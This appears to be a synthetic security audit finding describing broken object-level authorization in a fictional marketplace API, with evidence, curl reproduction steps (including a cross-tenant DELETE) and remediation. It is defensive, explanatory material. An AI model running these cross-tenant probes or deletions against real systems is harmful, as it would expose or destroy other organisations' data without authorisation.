## System

- System: ShopGrid Marketplace API v4.6.0
- Domain: E-COMMERCE / MARKETPLACE
- Example ID: BOLA-0003
- Risk ID: RISK-13-003

## Findings

### 1. BOLA on `GET /api/v3/resources` List Endpoint — No Tenant Filter Applied (Pattern 1.3, primary)

Section 4.0 states: "List endpoint `GET /api/v3/resources` returns all objects across tenants when no `tenant_id` filter is applied." The list handler does not scope results to the authenticated user's `tenant_id` from the JWT. An attacker from `ORG-1F8E` can call the list endpoint without any filter and receive resource records belonging to all tenants, including `ORG-396C`.

### 2. BOLA on `GET/PATCH/DELETE /api/v3/resources/:id` — ID Without Ownership Check (Pattern 1.1/1.3 overlap)

The same handler that serves the list endpoint also handles single-ID operations. Section 4.0: "The backend handler queries the database by ID only, without filtering by `owner_id` or `tenant_id`."

**HAR evidence**: JWT `X-Tenant-ID: ORG-1F8E`. Request: `GET /api/v3/resources/RES-2003`. Response: HTTP 200 OK with `{"tenantId": "ORG-396C", "ownerId": "other-user-1f8e396c", "sensitiveData": "CONFIDENTIAL: cross-tenant data for ORG-396C"}` — cross-tenant marketplace resource returned.

**E-commerce impact**: in a marketplace platform, `resources` may represent product listings, merchant contracts, or customer purchase records. Cross-tenant access exposes competitor pricing, product catalog structures, and customer data.

## Evidence

- **Section 4.0**: list endpoint returns all objects across tenants; single-ID handler lacks tenant/owner filter.
- **Section 3.0 schema comment**: "Application code does NOT use tenant_id in authorization checks."
- **RISK-13-003** (section 6.0): "Pattern 1.3 detected in `/api/v3/resources` handler. Remediation blocked pending DB migration ticket #DB-103."
- **HAR**: `GET /api/v3/resources/RES-2003` with `ORG-1F8E` JWT → HTTP 200 → `tenantId: ORG-396C` with `sensitiveData`.

## Reproduction

**Step 1 — Authorize baseline:**

```bash
curl -s "https://api.shopgrid-market.example.com/api/v3/resources/RES-1003" \
  -H "Authorization: Bearer <TOKEN_ORG-1F8E>" \
  -H "X-Tenant-ID: ORG-1F8E"
```

Expected: returns own resource with `tenantId: "ORG-1F8E"`.

**Step 2 — Cross-tenant single ID lookup (primary HAR attack):**

```bash
curl -s "https://api.shopgrid-market.example.com/api/v3/resources/RES-2003" \
  -H "Authorization: Bearer <TOKEN_ORG-1F8E>" \
  -H "X-Tenant-ID: ORG-1F8E"
```

Expected secure outcome: HTTP 403 or 404.  
Expected vulnerable outcome: HTTP 200 with `tenantId: "ORG-396C"` and `sensitiveData`.

**Step 3 — List endpoint without tenant filter (Pattern 1.3 primary variant):**

```bash
curl -s "https://api.shopgrid-market.example.com/api/v3/resources" \
  -H "Authorization: Bearer <TOKEN_ORG-1F8E>" \
  -H "X-Tenant-ID: ORG-1F8E"
```

Expected secure outcome: only `ORG-1F8E` resources returned.  
Expected vulnerable outcome: resources from multiple tenants including `ORG-396C` returned without filter.

**Step 4 — Bulk cross-tenant DELETE:**

```bash
curl -s -X DELETE "https://api.shopgrid-market.example.com/api/v3/resources/RES-2003" \
  -H "Authorization: Bearer <TOKEN_ORG-1F8E>"
```

Expected secure outcome: HTTP 403 or 404.  
Expected vulnerable outcome: HTTP 200 — cross-tenant resource deleted.

## Remediation

- **Enforce tenant filter on list endpoint**: `GET /api/v3/resources` must always scope to `WHERE tenant_id = $jwt_tenant_id`.
- **Add tenant and owner filter to single-ID handlers** (RISK-13-003): `WHERE resource_id = $id AND tenant_id = $jwt_tenant_id AND owner_id = $jwt_sub`.
- **Apply fix to all HTTP methods**: GET, PATCH, DELETE must all enforce the check.
- **Complete DB migration ticket #DB-103**: unblocked fix required.
- **Non-sequential IDs**: `RES-2003` enables enumeration.
